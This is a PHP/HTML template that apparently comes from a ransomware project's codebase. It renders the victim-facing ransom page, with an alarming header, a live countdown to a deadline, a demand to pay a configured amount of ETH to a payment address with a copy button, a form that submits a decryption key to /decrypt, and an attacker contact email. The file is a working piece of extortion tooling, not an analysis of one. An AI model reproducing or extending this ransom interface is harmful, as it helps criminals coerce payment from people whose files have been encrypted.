<?php
$config = \App\Core\ConfigManager::load('encryption');
$deadline = new DateTime();
$deadline->modify('+' . $config['ransom']['deadline_hours'] . ' hours');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Files Have Been Encrypted</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .warning-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .subtitle {
            font-size: 1.2em;
            opacity: 0.9;
        }
        
        .content {
            padding: 40px;
        }
        
        .countdown {
            background: #ffeaa7;
            border: 3px solid #fdcb6e;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            margin: 20px 0;
            font-size: 1.3em;
            font-weight: bold;
        }
        
        .timer {
            font-size: 2em;
            color: #e17055;
            font-family: 'Courier New', monospace;
        }
        
        .section {
            margin: 30px 0;
            padding: 25px;
            background: #f8f9fa;
            border-radius: 10px;
            border-left: 5px solid #667eea;
        }
        
        .section h3 {
            color: #2d3436;
            margin-bottom: 15px;
            font-size: 1.4em;
        }
        
        .payment-info {
            background: #fff3cd;
            border-color: #ffeaa7;
        }
        
        .address-box {
            background: #2d3436;
            color: #fff;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            margin: 15px 0;
            font-size: 0.9em;
        }
        
        .decryption-form {
            background: #d1ecf1;
            border-color: #bee5eb;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2d3436;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input[type="text"]:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: transform 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .btn-block {
            display: block;
            width: 100%;
        }
        
        .contact-info {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            background: #e8f5e8;
            border-radius: 10px;
        }
        
        .warning {
            background: #f8d7da;
            border-color: #f5c6cb;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            text-align: center;
        }
        
        @media (max-width: 768px) {
            .container {
                margin: 10px;
            }
            
            .content {
                padding: 20px;
            }
            
            h1 {
                font-size: 2em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="warning-icon">⚠️</div>
            <h1>YOUR FILES HAVE BEEN ENCRYPTED!</h1>
            <div class="subtitle">All your important files are encrypted with military-grade algorithms</div>
        </div>
        
        <div class="content">
            <div class="countdown">
                <div>Time remaining to pay:</div>
                <div class="timer" id="timer"><?php echo $config['ransom']['deadline_hours']; ?>:00:00</div>
                <div>Deadline: <?php echo $deadline->format('Y-m-d H:i:s'); ?> UTC</div>
            </div>
            
            <div class="section">
                <h3>What Happened?</h3>
                <p>All your important files including documents, photos, databases, and other data have been encrypted using strong encryption algorithms.</p>
                <p>The encryption key is stored securely on our servers and will be deleted after the deadline.</p>
            </div>
            
            <div class="section payment-info">
                <h3>How to Recover Your Files</h3>
                <p>To recover your data, you need to follow these steps:</p>
                <ol style="margin: 15px 0; padding-left: 20px;">
                    <li>Send <strong><?php echo $config['ransom']['amount_eth']; ?> ETH</strong> to the Ethereum address below</li>
                    <li>Contact us with your transaction hash and contact information</li>
                    <li>We will verify the payment and send you the decryption key</li>
                </ol>
                
                <div class="form-group">
                    <label>Ethereum Address:</label>
                    <div class="address-box" id="ethAddress">
                        <?php echo $config['ransom']['payment_address']; ?>
                    </div>
                    <button class="btn" onclick="copyToClipboard()">Copy Address</button>
                </div>
            </div>
            
            <div class="section decryption-form">
                <h3>Already Paid?</h3>
                <p>If you have already made the payment, enter your decryption key below:</p>
                
                <form method="post" action="/decrypt">
                    <div class="form-group">
                        <label for="decryption_key">Decryption Key:</label>
                        <input type="text" id="decryption_key" name="decryption_key" 
                               placeholder="Enter the decryption key you received" required>
                    </div>
                    <button type="submit" class="btn btn-block">Decrypt Files</button>
                </form>
            </div>
            
            <div class="contact-info">
                <h3>Need Help?</h3>
                <p>Contact us at: <strong><?php echo $config['ransom']['contact_email']; ?></strong></p>
                <p>Include your transaction hash and we'll respond within 24 hours.</p>
            </div>
            
            <div class="warning">
                <strong>WARNING:</strong> Do not attempt to decrypt files without the proper key. 
                This may cause permanent data loss. Do not modify encrypted files.
            </div>
        </div>
    </div>

    <script>
        function updateTimer() {
            const deadline = new Date();
            deadline.setHours(deadline.getHours() + <?php echo $config['ransom']['deadline_hours']; ?>);
            
            function tick() {
                const now = new Date().getTime();
                const diff = deadline - now;
                
                if (diff <= 0) {
                    document.getElementById('timer').textContent = 'EXPIRED';
                    document.getElementById('timer').style.color = '#ff6b6b';
                    return;
                }
                
                const hours = Math.floor(diff / (1000 * 60 * 60));
                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
                
                document.getElementById('timer').textContent = 
                    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }
            
            tick();
            setInterval(tick, 1000);
        }
        
        function copyToClipboard() {
            const address = document.getElementById('ethAddress').textContent;
            navigator.clipboard.writeText(address).then(function() {
                alert('Ethereum address copied to clipboard!');
            }, function(err) {
                console.error('Could not copy text: ', err);
            });
        }
        
        // Initialize
        updateTimer();
        
        // Add some visual effects
        document.addEventListener('DOMContentLoaded', function() {
            const container = document.querySelector('.container');
            container.style.opacity = '0';
            container.style.transform = 'translateY(20px)';
            
            setTimeout(() => {
                container.style.transition = 'all 0.5s ease';
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 100);
        });
    </script>
</body>
</html>